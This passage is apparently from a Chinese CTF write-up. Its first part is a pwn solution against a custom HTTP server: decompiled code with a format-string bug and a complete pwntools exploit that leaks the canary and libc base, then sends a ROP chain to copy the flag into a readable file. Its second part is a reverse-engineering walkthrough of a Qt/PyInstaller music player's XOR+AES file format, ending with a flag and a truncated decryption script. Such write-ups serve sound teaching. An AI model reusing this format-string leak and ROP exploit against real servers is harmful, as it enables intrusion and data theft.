<p>可以发现，v9正常有72个字节的空间，而第17、18行的循环有512字的逐字替换，所以这里可以造成栈溢出布置ROP。但是后面有canary，以及我们需要获得libc_base以及可能需要的pie_base、stack_info，所以仍旧需要找到如何泄漏内存地址。</p>
<ol>
<li>于是可以找到<code>file_does_not_exist</code>函数，其中有不标准的格式化字符串写法，利用这里的<code>snprintf</code>函数，我们可以泄漏出内存中的信息</li>
</ol>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">file_does_not_exist</span><span class="params">(<span class="type">int</span> a1, <span class="type">const</span> <span class="type">char</span> *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">size_t</span> v2; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">1288</span>]; <span class="comment">// [rsp+10h] [rbp-520h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+518h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">snprintf</span>(</span><br><span class="line">    s,</span><br><span class="line">    <span class="number">0x500</span>uLL,</span><br><span class="line">    <span class="string">&quot;HTTP/1.1 404 Not Found\r\n&quot;</span></span><br><span class="line">    <span class="string">&quot;server: NsusServer :&gt;\r\n&quot;</span></span><br><span class="line">    <span class="string">&quot;stribik: Ciallo\r\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Content-Type: text/html\r\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    <span class="string">&quot;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;meta charset=\&quot;UTF-8\&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;div align=&#x27;center&#x27;&gt;file&quot;</span></span><br><span class="line">    <span class="string">&quot; does not exist:&quot;</span>);</span><br><span class="line">  v2 = <span class="number">1258</span> - <span class="built_in">strlen</span>(s);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="built_in">snprintf</span>(&amp;s[v3], v2, a2);</span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;s[<span class="built_in">strlen</span>(s)], <span class="string">&quot;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="built_in">send</span>(a1, s, v4, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> v7 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ol>
<li>但是若是想通过<code>send_file_with_headers</code>来获取flag是不可行的，首先主文件限制了只能获取当前目录下的文件，而文件部署在<code>/home/ctf</code>，所以不能目录穿越到<code>/proc</code>或者其他办法获取$ENV，而当前文件夹下的flag文件被在前面的<code>contains_flag</code>特判了，所以不能直接获取flag，所以我们需要另外地通过读取flag并写入到其他文件中，再通过<code>send_file_with_headers</code>来读取新文件以获取flag，由此我们可以得到如下第二部分的exp：</li>
</ol>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary=<span class="string">&quot;./server&quot;</span></span><br><span class="line">context.binary=binary</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">ip = </span><br><span class="line">port = </span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">s    =    <span class="keyword">lambda</span> a              :io.send(a)</span><br><span class="line">sl   =    <span class="keyword">lambda</span> a              :io.sendline(a)</span><br><span class="line">sa   =    <span class="keyword">lambda</span> a,b            :io.sendafter(a,b)</span><br><span class="line">sla  =    <span class="keyword">lambda</span> a,b            :io.sendlineafter(a,b)</span><br><span class="line">r    =    <span class="keyword">lambda</span> a              :io.recv(a)</span><br><span class="line">rl   =    <span class="keyword">lambda</span>                :io.recvline()</span><br><span class="line">ru   =    <span class="keyword">lambda</span> a,b=<span class="literal">True</span>       :io.recvuntil(a,b)</span><br><span class="line">se   =    <span class="keyword">lambda</span> i              :<span class="built_in">str</span>(i).encode()</span><br><span class="line">lss  =    <span class="keyword">lambda</span> s :log.success(<span class="string">&quot;[1;30;41m%s --&gt; 0x%x [0m&quot;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line"></span><br><span class="line">io = remote(ip, port)</span><br><span class="line">s(<span class="string">b&#x27;GET /%159$p.%167$p.%170$p. &#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">base = <span class="built_in">int</span>(ru(<span class="string">b&#x27;.&#x27;</span>), <span class="number">16</span>) - <span class="number">0x7f1aa</span></span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(ru(<span class="string">b&#x27;.&#x27;</span>), <span class="number">16</span>)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(ru(<span class="string">b&#x27;.&#x27;</span>), <span class="number">16</span>)</span><br><span class="line">lss(<span class="string">b&#x27;base - &#x27;</span>+<span class="built_in">hex</span>(base).encode())</span><br><span class="line">lss(<span class="string">b&#x27;canary - &#x27;</span>+<span class="built_in">hex</span>(canary).encode())</span><br><span class="line">lss(<span class="string">b&#x27;stack - &#x27;</span>+<span class="built_in">hex</span>(stack).encode())</span><br><span class="line">stack1 = stack+<span class="number">192</span></span><br><span class="line">stack2 = stack+<span class="number">156</span></span><br><span class="line">io.close()</span><br><span class="line">io = remote(ip, port)</span><br><span class="line">accept = base + libc.sym.accept</span><br><span class="line">openn = base  + libc.sym.<span class="built_in">open</span></span><br><span class="line">read = base + libc.sym.read</span><br><span class="line">write = base + libc.sym.write</span><br><span class="line">sendfile = base + libc.sym.sendfile</span><br><span class="line">rdi = base + <span class="number">0x2a3e5</span></span><br><span class="line">rsi = base + <span class="number">0x2be51</span></span><br><span class="line">rdbx= base + <span class="number">0x904a9</span></span><br><span class="line">rcx = base + <span class="number">0x3d1ee</span></span><br><span class="line">payload =  <span class="string">b&#x27;GET /a.cgi?input=&#x27;</span>+<span class="string">b&#x27;flag\x00\x00\x00\x00&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;aaaa&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">52</span>+p64(canary)*<span class="number">5</span></span><br><span class="line">payload += flat(rdi, stack-<span class="number">0x260</span>, rsi, <span class="number">0</span>, openn, rdi, stack-<span class="number">0x258</span>, rsi, <span class="number">0x241</span>, rdbx, <span class="number">0o777</span>, <span class="number">0</span>, openn)</span><br><span class="line"><span class="comment"># open(flag, 0), fd=5</span></span><br><span class="line"><span class="comment"># open(aaaa, 0x241, 0o777), fd=6</span></span><br><span class="line">payload += flat(rdi, <span class="number">5</span>, rsi, stack-<span class="number">0x100</span>, rdbx, <span class="number">0x100</span>, <span class="number">0</span>, read)</span><br><span class="line"><span class="comment"># read(5, stack-0x100, 0x100)</span></span><br><span class="line">payload += flat(rdi, <span class="number">6</span>, rsi, stack-<span class="number">0x100</span>, rdbx, <span class="number">0x100</span>, <span class="number">0</span>, write)</span><br><span class="line"><span class="comment"># write(6, stack-0x100, 0x100) </span></span><br><span class="line">s(payload)</span><br><span class="line">io.close()</span><br><span class="line">io = remote(ip, port)</span><br><span class="line">s(<span class="string">b&#x27;GET /aaaa &#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(io.recv())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="题目-鱼音乐"><a href="#题目-鱼音乐" class="headerlink" title="题目-鱼音乐"></a>题目-鱼音乐</h2><p>知识点</p>
<ol>
<li>静态分析</li>
<li>Qt逆向</li>
<li>Pyinstaller程序解包</li>
<li>PYD逆向</li>
<li>AES加密</li>
<li>XOR</li>
</ol>
<p><strong>正常步骤分析</strong></p>
<p><strong>步骤1：整体文件分析</strong></p>
<p>首先打开得到的应用程序，主要的可执行程序是让我们加载这个.xianyu文件的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360107/1748344011155-58b31e11-f357-4c29-bba4-864b5e811e8a.png"
                      alt="img"
                ></p>
<p>我们进去运行，可以看到如下的输出</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360107/1748347820090-6ecf3e5e-2a8d-4ee5-8dff-5f82fc3016e7.png"
                      alt="img"
                ></p>
<p>关键信息就是让我们找到在隐藏在音频信息文件中的flag。所以我们的整体思路就是反编译加载器，看.xianyu文件是如何被加载的。</p>
<p><strong>步骤2：反编译pyc文件</strong></p>
<p>对main.exe先解包</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360107/1748344312311-dbfc314d-6abd-4696-bc56-55902605c72a.png"
                      alt="img"
                ></p>
<p>关键的main.pyc拿去反编译</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360107/1748344340818-be66d291-98a8-4f2f-a2ce-c28bc3c00bce.png"
                      alt="img"
                ></p>
<p>在线网站得到的结果如下</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, os</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtWidgets <span class="keyword">import</span> QApplication, QMainWindow, QWidget, QPushButton, QLabel, QVBoxLayout, QFileDialog, QMessageBox</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtGui <span class="keyword">import</span> QPixmap</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtMultimedia <span class="keyword">import</span> QMediaPlayer, QMediaContent</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtCore <span class="keyword">import</span> QUrl</span><br><span class="line"><span class="keyword">from</span> xianyu_decrypt <span class="keyword">import</span> load_and_decrypt_xianyu</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MainWindow</span>(<span class="title class_ inherited__">QMainWindow</span>):</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.setWindowTitle(<span class="string">&#x27;Fish Player - 鱼音乐🐟&#x27;</span>)</span><br><span class="line">        self.resize(<span class="number">600</span>, <span class="number">400</span>)</span><br><span class="line">        self.player = QMediaPlayer(self)</span><br><span class="line">        self.open_button = QPushButton(<span class="string">&#x27;打开 .xianyu 文件&#x27;</span>)</span><br><span class="line">        self.open_button.clicked.connect(self.open_xianyu)</span><br><span class="line">        self.cover_label = QLabel(<span class="string">&#x27;专辑封面展示&#x27;</span>)</span><br><span class="line">        self.cover_label.setScaledContents(<span class="literal">True</span>)</span><br><span class="line">        self.cover_label.setFixedSize(<span class="number">300</span>, <span class="number">300</span>)</span><br><span class="line">        layout = QVBoxLayout()</span><br><span class="line">        layout.addWidget(self.open_button)</span><br><span class="line">        layout.addWidget(self.cover_label)</span><br><span class="line">        container = QWidget()</span><br><span class="line">        container.setLayout(layout)</span><br><span class="line">        self.setCentralWidget(container)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">open_xianyu</span>(<span class="params">self</span>):</span><br><span class="line">        file_path, _ = QFileDialog.getOpenFileName(self, <span class="string">&#x27;选择 .xianyu 文件&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;Xianyu Files (*.xianyu)&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> file_path:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            info = load_and_decrypt_xianyu(file_path)</span><br><span class="line">            meta = info[<span class="string">&#x27;meta&#x27;</span>]</span><br><span class="line">            cover_path = info[<span class="string">&#x27;cover_path&#x27;</span>]</span><br><span class="line">            audio_path = info[<span class="string">&#x27;audio_path&#x27;</span>]</span><br><span class="line">            <span class="keyword">if</span> cover_path <span class="keyword">and</span> os.path.exists(cover_path):</span><br><span class="line">                pixmap = QPixmap(cover_path)</span><br><span class="line">                self.cover_label.setPixmap(pixmap)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.cover_label.setText(<span class="string">&#x27;无封面&#x27;</span>)</span><br><span class="line">            url = QUrl.fromLocalFile(audio_path)</span><br><span class="line">            self.player.setMedia(QMediaContent(url))</span><br><span class="line">            self.player.play()</span><br><span class="line">            name = meta.get(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;未知&#x27;</span>)</span><br><span class="line">            artist = meta.get(<span class="string">&#x27;artist&#x27;</span>, <span class="string">&#x27;未知歌手&#x27;</span>)</span><br><span class="line">            flag = meta.get(<span class="string">&#x27;fl4g&#x27;</span>, <span class="string">&#x27;tellme&#x27;</span>)</span><br><span class="line">            QMessageBox.information(self, <span class="string">&#x27;🐟音乐提示您&#x27;</span>, <span class="string">f&quot;正在播放：<span class="subst">&#123;name&#125;</span>\n歌手：<span class="subst">&#123;artist&#125;</span>\nfl4g:<span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                QMessageBox.critical(self, <span class="string">&#x27;错误&#x27;</span>, <span class="built_in">str</span>(e))</span><br><span class="line">            <span class="keyword">finally</span>:</span><br><span class="line">                e = <span class="literal">None</span></span><br><span class="line">                <span class="keyword">del</span> e</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    app = QApplication(sys.argv)</span><br><span class="line">    w = MainWindow()</span><br><span class="line">    w.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div>

<p>可以看到这里并没有核心的加密，但是可以看到其中的  meta.get  是从.xianyu文件经过了pyd库中的load_and_decrypt_xianyu方法返回的信息，根据上述的提示，我们可以猜测是一个参数就是我们最后的flag信息，那么整体思路就是看如何加载出来完整的meta信息。</p>
<p><strong>步骤3：分析pyd库文件</strong></p>
<p>将pyd放进ida中反编译，可以看到并没有进行符号的删除，这样方便了我们的分析，只看函数名我们就可以大致推断出一些过程</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360107/1748348190562-fdf500b7-a7cb-4f1a-8910-2279f2d41644.png"
                      alt="img"
                ></p>
<p>比如read_partx就可能是再解密加载xianyu文件的过程中，对特定的文件进行了读取并解密。除此之外还能看到aes的加密以及main中调用的函数，load_and_decrypt_xianyu。我们首先从这个函数进行大体分析</p>
<p>首先查看此函数的末尾，可以看到对于dict字典的操作，这里他的返回值我们可以看到是meta元信息，cover封面路径，audio音频路径。那么很明显，前面看到的读取不同部分便是读取了经过加密的meta信息，封面信息，音频信息。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360107/1748348522098-38e6a3b6-3f76-440b-b081-414388643925.png"
                      alt="img"
                ></p>
<p>而根据步骤2的分析，我们想要获取的内容关键字就是meta。接着向上找关键词。</p>
<p>我们逐步向上找，并没有什么核心的加载过程，主要就是对read函数的调用，形式如下，我们需要去这五个函数中看看各自加载了什么部分。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360107/1748348949019-a75081b2-0069-45ae-a7eb-8462bc58c2ef.png"
                      alt="img"
                ></p>
<p>part1分析</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360107/1748349209717-66da46bb-7458-4126-b7b7-fd2e60f932b2.png"
                      alt="img"
                ></p>
<p>从关键词中可以看出，第一部分是对文件头的比较判断，我们如果详细去理解这段代码</p>
<p>首先是在self变量中，去保存了当前的偏移地址，然后进行切片操作，验证比较头字节是否为预期值，最后使用add方法，对偏移值加上8（头字节的长度）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360107/1748349640822-1a0b6804-36be-4e22-96ce-d737815a967e.png"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360107/1748349652883-ec860f9e-1e40-498b-a339-837e9b479e4f.png"
                      alt="img"
                ></p>
<p>理解为python可以理解为</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">read_part1</span>(<span class="params">data: <span class="built_in">bytes</span>, offset: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    header = data[offset : offset + <span class="number">8</span>]          <span class="comment"># 切片操作</span></span><br><span class="line">    <span class="keyword">if</span> header != XIANYU_HEADER:                 <span class="comment"># 头部验证</span></span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Invalid header&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> offset + <span class="number">8</span>                           <span class="comment"># 返回新偏移量</span></span><br></pre></td></tr></table></figure></div>

<p>分析part2</p>
<p>首先也是看到了和上面相似的切片操作，这里对前4字节进行了切片操作</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360107/1748350308800-bacb9bac-6d73-43f5-affb-dbb7ffde4542.png"
                      alt="img"
                ></p>
<p>随后读取前四字节数据小端序整数作为数据，可以推断出，就是当前数据的长度，后面作为偏移地址加的数据，从而分析下一部分的内容。</p>
<p>继续下寻操作，可以理解出，是对以下长度的数据进行了逐字节的解密，这里首先进行的就是异或操作，异或了0x33</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360107/1748350486285-ed358fd4-e29e-467c-81f4-e32d9affb998.png"
                      alt="img"
                ></p>
<p>接着在下面进行了aes的解密操作，可以看到存在了BuiltinName变量中</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360107/1748350689912-684f0a6b-d26a-4d14-932b-60fa10689d59.png"
                      alt="img"
                ></p>
<p>后续对于异或后的数据以及密钥进行了调用，共同作为aes解密的参数</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360107/1748350860728-9b54d780-6787-43bd-b6c1-1f8a3e4c5df6.png"
                      alt="img"
                ></p>
<p>整体的步骤就分析完毕了，我们可以看出这里就是一个异或和一个AES解密，那么解密的密钥实际上根据字符串索引或者主动调用help我们就可以得到XianYuAESKey0000</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360107/1748350972264-cdd76502-8934-4dd4-adc9-300381e5e4c1.png"
                      alt="img"
                ></p>
<p>主动调用</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360107/1748351036011-72ce22aa-967e-4abe-99c8-b32088a2cd62.png"
                      alt="img"
                ></p>
<p>现在我们就是去文件中获取我们的密文</p>
<p><strong>步骤4：.xianyu文件分析</strong></p>
<p>根据上述的分析过程，我们已经对字节代表什么有了一定的了解</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360107/1748351277749-c8e84cc8-30bd-457e-85dc-60299678118d.png"
                      alt="img"
                ></p>
<p>可以看到part1分析的头字节，紧跟着后面四字节明显0x20，计算完毕20字节后，可以看到再后面的四字节就是part3的长度0x84B2B，那么我们的密文就是这之间的0x20个字节，拿去解密</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360107/1748351462426-efbe2dc6-a2a7-49d9-b6ff-dacc4dd2b5e2.png"
                      alt="img"
                ></p>
<p>解密出了一段字符串 xianyu_jsonmusic 后面可能还有别的用处</p>
<p><strong>步骤5：继续分析其他的关键部分</strong></p>
<p>继续分析part3，从其中的参数名就可以知道是对封面的解读，那么很分析过程也和上面没有太大的差距，这里分析完毕发现只有一个异或0x22的操作，我们提取数据，拿去解密，果然得到了图片</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360107/1748351672661-ea4852ab-c629-47f7-b35e-19b0bb47b9e6.png"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360107/1748351664827-3e8bfccf-ff1e-4e9a-b4b4-15405e7bad18.png"
                      alt="img"
                ></p>
<p>分析part4，这里注意到相比之前多出来一个file_key的参数，并且根据参数知道了这里就是我们想得到的meta元数据的解密部分。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360107/1748351807988-784ead28-7b07-4adc-b0ae-89e8803aa8ec.png"
                      alt="img"
                ></p>
<p>读取文件步骤与前面同理，只需要找到进行了什么操作</p>
<p>同样是进行了aes加密</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360107/1748352035988-0ba8cc13-2063-432c-aba1-99ace67f1339.png"
                      alt="img"
                ></p>
<p>参数v29可以看出是meta的数</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360107/1748351961708-b185b0fd-834b-436f-b945-06bcfb1a1cd7.png"
                      alt="img"
                ></p>
<p>这里进行了aes的解密函数调用，参数可以看到是meta的数据</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360107/1748352002992-e0788b2a-afdb-4003-8cd3-9a8af9e06ac9.png"
                      alt="img"
                ></p>
<p>那么密钥就是参数中的filekey了，他是从哪里传入的？返回调用他们的函数，我们再去看参数，</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360107/1748352634287-81c022f6-af57-4d09-bee1-13e969cf3a5a.png"
                      alt="img"
                ></p>
<p>关注第三个参数v196[2]，向上查找v178，可以看到他的上一次的调用，是在read_part2快要结束时</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360107/1748352839713-283149f4-4d74-4cc6-81ba-29b0ce86753b.png"
                      alt="img"
                ></p>
<p>向上索引，此变量赋值为v18元组的第二个参数，继续向上不难发现，v18正是这个read_part2的返回值，也就是我们上面分析出来的密钥值</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360107/1748353076382-5c12f440-4d46-49a4-b71e-f95165937abd.png"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360107/1748353190896-63d0fcff-045d-40c1-91e0-70b101880d49.png"
                      alt="img"
                ></p>
<p>从文件中提取关键的信息，填写上一步解密出来的密钥，进行aes解密，可以看到解密出来的json信息中就有我们的flag，最终得到答案</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360107/1748352200684-e5ea6a75-ad19-41c8-a5bc-3545207d5179.png"
                      alt="img"
                ></p>
<p>DASCTF{fl5h_mus1c_miao_m1a0_mlaO}</p>
<p>使用脚本解密就是</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360107/1748352479201-34290504-a218-4fb4-8850-1791985ab744.png"
                      alt="img"
                ></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">ciphertext_hex = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">2F A5 C3 63 43 7F 3C A1 EF 2C 85 E8 